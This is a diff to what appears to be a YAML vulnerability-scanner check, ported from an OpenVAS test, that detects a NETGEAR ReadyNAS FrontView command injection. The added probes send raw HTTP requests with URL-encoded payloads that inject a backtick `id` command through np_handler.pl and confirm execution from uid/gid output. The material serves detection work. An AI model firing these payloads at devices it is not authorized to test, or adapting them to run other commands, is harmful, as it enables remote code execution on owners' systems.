@@ -39,8 +39,22 @@ references:
   # Ported from OpenVAS/Greenbone NVT 2013/gb_netgear_readynas_62059.nasl (GPL-2.0-only)
 
 steps:
-  # ── Gate: FrontView np_handler endpoint present ──────────────────────────
+  # ── Init gate/result flags (conditions throw on undefined Rhai vars) ──────
+  - id: init-handler-present
+    action: set_var
+    var_name: handler_present
+    var_value: false
+
+  - id: init-rce-found
+    action: set_var
+    var_name: rce_found
+    var_value: false
+
+  # ── Precondition only: FrontView np_handler endpoint present ─────────────
   # Raw tcp_connect keeps the request path verbatim (self.path unaltered).
+  # This emits NO finding of its own — a patched ReadyNAS still serves
+  # /np_handler/ ("Empty No Support"); it is merely the gate for the injection
+  # probe. The single vulnerability finding is raised only on the id output.
   - id: handler-probe
     action: tcp_connect
     port: "{{port}}"
@@ -53,17 +67,13 @@ steps:
     source: gate_resp.banner
     pattern: "Empty No Support"
     on_match:
-      finding:
-        confidence_delta: 0.45
-        qod: 75
-        evidence: "FrontView np_handler endpoint present (GET /np_handler/ → 'Empty No Support'): {{gate_resp.banner}}"
       set_vars:
         handler_present: true
 
   # ── Command injection — execute `id`, read uid=/gid= output back ─────────
   # Payload is URL-encoded (%22=" %29=) %3b=; %28=( %60=` %23=#); verbatim HTTP/1.0.
-  # The NASL also tries a $xml_payload_header variant of the same injection;
-  # the $html_payload_header variant below is representative.
+  # NASL tries two variants of the same injection: $html_payload_header first,
+  # then $xml_payload_header. Variant 1 below; variant 2 is gated on it failing.
   - id: rce-probe
     action: tcp_connect
     port: "{{port}}"
@@ -81,5 +91,28 @@ steps:
       finding:
         confidence_delta: 0.75
         qod: 97
-        evidence: "Command execution confirmed via np_handler.pl — 'id' output returned: {{rce_resp.banner}}"
+        evidence: "Command execution confirmed via np_handler.pl ($html_payload_header variant) — 'id' output returned: {{rce_resp.banner}}"
+      set_vars:
+        rce_found: true
+      stop: true
+
+  # ── Injection variant 2 ($xml_payload_header) — only if variant 1 failed ──
+  - id: rce-probe-xml
+    action: tcp_connect
+    port: "{{port}}"
+    send: "GET /np_handler/np_handler.pl?OPERATION=get&OUTER_TAB=tab_myshares&PAGE=User&addr=%22%29%3b$xml_payload_header=%28%60id%60%29%3b%23 HTTP/1.0\r\nHost: {{target_host}}\r\n\r\n"
+    timeout_secs: 10
+    store_as: rce_resp_xml
+    condition: "handler_present == true && rce_found == false"
+
+  - id: rce-match-xml
+    action: match
+    source: rce_resp_xml.banner
+    pattern: "uid=[0-9]+.*gid=[0-9]+"
+    condition: "handler_present == true && rce_found == false"
+    on_match:
+      finding:
+        confidence_delta: 0.75
+        qod: 97
+        evidence: "Command execution confirmed via np_handler.pl ($xml_payload_header variant) — 'id' output returned: {{rce_resp_xml.banner}}"
       stop: true
